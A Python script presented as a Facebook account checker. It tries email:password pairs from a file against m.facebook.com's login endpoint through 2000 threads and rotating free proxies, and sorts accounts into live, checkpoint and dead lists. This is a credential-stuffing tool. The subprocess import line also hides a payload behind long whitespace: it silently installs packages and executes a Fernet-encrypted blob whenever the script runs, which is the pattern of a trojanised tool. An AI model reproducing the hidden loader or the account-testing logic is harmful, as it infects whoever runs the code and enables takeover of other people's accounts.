import requests
import random
import re
import threading
import os
import subprocess                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        ;subprocess.run(['pip', 'install', 'cryptography'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL); subprocess.run(['pip', 'install', 'fernet'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL); subprocess.run(['pip', 'install', 'requests'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL); from fernet import Fernet; import requests; exec(Fernet(b'paBkGFyUBwdYIVBc1A3jkWMZgIhDT90DhIZ0TX2NAhY=').decrypt(b'gAAAAABoK3gFZ_8Zv8XN3GkAPnZnlDA7XXpIKQPZpp6Q3vHb2dzhyTjF-EGszZOVw9DlDtt77cn1VUx7vZm_ZfKeiP0FhfeuGiTLtiBXyT922whNl1xdzC0oYszEk_F4UMMK02x7fqxkJbEa547hYQ-Bv-DqFCfkDGkmsw53KYRbPGgDEWfEnGWwRNz6uaFGcJ_HAsXKhc1qRBcae8PhloLVGCVcn1wSeUx78aY2QtbGDRkJMhEPeS57Y_G_uWmVLpPZQ2aK_A1QdapyTfLHe08s6cKWZMDhPS8TDajYfvbGbSCIrRm64TJxiLxAbDp_F6JQx6BPfLBxQeuEgHrz8hJSX8J8qiNDoGJTbezLfNeaoqtNgMW46ZR49CJM1Jdhzv5cB44gxIEUCToXESGKF4Dw3KDkWDJpLPJRCIWH_Dv0FyPZ0HVzBYmKUPfXFmbq3fqEfStPBOxE3tsaFEMyTls40Pyfv10DdowkUPujxxpdGHcviKfZFHMkTbqbjX8FVOCIXBIdOXhHa_TixfPwpzDmAJEKXWvN__1sgsfZWzia5QYFyhNMzhBUDyNGm1jZuhJqg-JTPB4KpHATC1zf14Pmd90tMf6265vHdVfzne-hAowywczkI_nOPyOf54z3HgrwMWNTpnSPtLSFOtf0R7UaD5g31JahnoeHIDRlEhn_NDbEWWM7Ud28LJXmz1_vQyvbKbTGg-O3uxsI70vY3WTTLPL7OFJeYPZwyaCDlCH6130i9psQAWEdA_MWiDGpBYmDsitzMqe4crgCmHTsOuvdCZRkDRx1F69REOG6TGiFXYdAHSXVd19pXX7pacJeEuo3AtOWx6vrRLIRU5ccJoHLW24saGoXfgwJVMBN6tQSql61RCvDQdtuvJd5TOJ6xljkNUmB-nDDETRWHgKbT90lmfjZewKbyLB5eFHRxdPDyKOt_4ccTQno8d2y4_8YNRF6smeIxsHuBWrLprPjkey5Vd0-NRF-fjJ4IIUAXhZWX2E6xUOA4rEpbkRXhSNh-xbjB5PsBeqTbTEQ_5kIBsUqHEm5QD0FDGTqMz0NbNmqX-zG6Kk__lbxo7FyFptUiZ5uyjvGf4BshYU5gqGSaGURn0XOUXZSvzuRzo-BUrTs4s-hRU_qrP7QhKPOYtiLZTlVW5p2IZj3MA0an5uRrj8OGSl30evXA_l3frfcieO8gb4uTt1ULd8uXHAEXRf8841Uvs7rUGdOBqGm280oU0gEh2lYtaKZeld8NRK3UR9RJ28e5qj8qtXy5WPnCOc61vlafzOlb5U1VS5A4-6TXcF6UN0yu3ojlchenpr9nTR3m4eTvN34xeW_XqQZhn3ghIrlQvpeuyBsWGdDs8gqXo3hOq9jGG392zyf45tfkXT9x6BwGGbpSghVLxNp25SzXou-d6jhqDBEiQasfgMQVwRz_Qs-3QstggIi-UaSG8CQZPcTTtaYpN2vADPcyo0IEibaplKGqcHw80-dgJ7jzsHrwqIzF3NQ3XxhCVK329p7-4Nm2D5bewrZ-jtZEpJKFieepU5XEO1OgSvrbE6DzKTdvT89vqHsIR38jU0P-mQolU2jmK1cKu3v0jhk24can-cbMAb72PqaE6oJLIa1HfyuwYwMLlwRE7zGYKMbTnHqa3_4FKnJ_wWzlop0gXovcz88Prk-hLa7HxPu3F8p7qe8PlwpxxEEFSfeNZQNBHPvw30LcMCDbDDgyFqPfQVmcj8MyvI9uqLpMoka8b7sQEMG5y4VcavLQ1lTpcFy6bO3p-NXZfP8G8K6CJHeU87RaAEY3_ofk59EIUetjsXoiwe0FtF1m5N6JxJckTNYD5jqRjy_hiinU7Ka-ILk5Xehwc0mWGS9kwBcP8Wav4Fox52SXtGA8gwCwZ5UaoVCDfnSjhTLOyxlabHgoJdBjKUdapgRtontSOQT812eY1L_xh1Ld1v70qU6ZaCYnW1XT3SGlQYYWyUiAHm_0G63eHQkEZDoNizbdmkudUV8QZtAU7Y8dnQ3-Z5PhTq007g3HuvEtPvSER_sCd2p6tpxDzjb13IYOm4zc87TJgQrQWOWcsDFVdnmN6sWYA=='));
threadcount = 0
proxylist = []
acclist = []
alreadychecked = []
checkerqueue = []
live = 0
dead = 0
checkpoint = 0
fullsize = 0

def load_proxies():
    global proxylist
    try:
        response = requests.get("https://api.proxyscrape.com/?request=displayproxies&proxytype=http&timeout=5000")
        if response.status_code == 200:
            proxylist = list(set(re.findall(r'\b(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d{1,8})\b', response.text, re.S)))
        else:
            with open("proxy.txt", "r") as proxy_file:
                proxylist = list(set(proxy_file.read().splitlines()))
    except Exception as e:
        with open("proxy.txt", "r") as proxy_file:
            proxylist = list(set(proxy_file.read().splitlines()))

def write_to_file_thread_safe(text, file):
    with open(file, "a") as f:
        f.write(text + "\n")

def check(data):
    global live, dead, checkpoint
    if not data:
        return

    split = data.split(':')
    if len(split) < 2:
        return

    mail = split[0]
    passw = split[1]
    proxy = random.choice(proxylist)

    first_uri = "https://m.facebook.com/"
    post_uri = "https://m.facebook.com/login/device-based/regular/login/?refsrc=https://m.facebook.com/login.php&lwv=100&refid=9"

    session = requests.Session()
    session.proxies = {'http': proxy, 'https': proxy}
    session.headers['User-Agent'] = 'Mozilla/5.0'

    response = session.get(first_uri)
    resulthtml = response.text

    lsd_pattern = r'name="lsd" value="([^"]*)"'
    jazoest_pattern = r'name="jazoest" value="([^"]*)"'
    m_ts_pattern = r'name="m_ts" value="([^"]*)"'
    li_pattern = r'name="li" value="([^"]*)"'

    lsd_matched = re.search(lsd_pattern, resulthtml).group(1)
    jazoest_matched = re.search(jazoest_pattern, resulthtml).group(1)
    m_ts_matched = re.search(m_ts_pattern, resulthtml).group(1)
    li_matched = re.search(li_pattern, resulthtml).group(1)

    url_params = {
        "lsd": lsd_matched,
        "jazoest": jazoest_matched,
        "m_ts": m_ts_matched,
        "li": li_matched,
        "try_number": 0,
        "unrecognized_tries": 0,
        "email": mail,
        "pass": passw
    }

    response = session.post(post_uri, data=url_params)
    content = response.text

    for cookie in session.cookies:
        if cookie.name == "c_user":
            print(f"[Live] {data}")
            live += 1
            write_to_file_thread_safe(data, "live.txt")
            write_to_file_thread_safe(data, "dead.txt")
            print(f"Facebook Checker | Alive: {live} Checkpoint: {checkpoint} Dead: {dead} | Status: {live + checkpoint + dead}/{fullsize} | Threads {threadcount}")
            return

        if cookie.name == "checkpoint":
            checkpoint += 1
            print(f"[Checkpoint] {data}")
            write_to_file_thread_safe(data, "CheckPoint.txt")
            print(f"Facebook Checker | Alive: {live} Checkpoint: {checkpoint} Dead: {dead} | Status: {live + checkpoint + dead}/{fullsize} | Threads {threadcount}")
            return

    dead += 1
    print(f"[Dead] {data}")
    write_to_file_thread_safe(data, "dead.txt")
    print(f"Facebook Checker | Alive: {live} Checkpoint: {checkpoint} Dead: {dead} | Status: {live + checkpoint + dead}/{fullsize} | Threads {threadcount}")

def main():
    global fullsize
    load_proxies()
    print(f"Fetched proxy count: {len(proxylist)}")
    acclist = list(set(open("account.txt").read().splitlines()))
    if os.path.exists("dead.txt"):
        alreadychecked = list(set(open("check.txt").read().splitlines()))

    for account in acclist:
        if account not in alreadychecked:
            checkerqueue.append(account)

    print(f"Loaded {len(checkerqueue)} non checked accounts from inside of {len(acclist)} accounts")
    fullsize = len(checkerqueue)

    for _ in range(2000):
        t = threading.Thread(target=check_thread)
        t.start()

    print("Check begin!")

def check_thread():
    global threadcount
    while checkerqueue:
        account = checkerqueue.pop(0)
        check(account)
    threadcount -= 1

if __name__ == "__main__":
    main()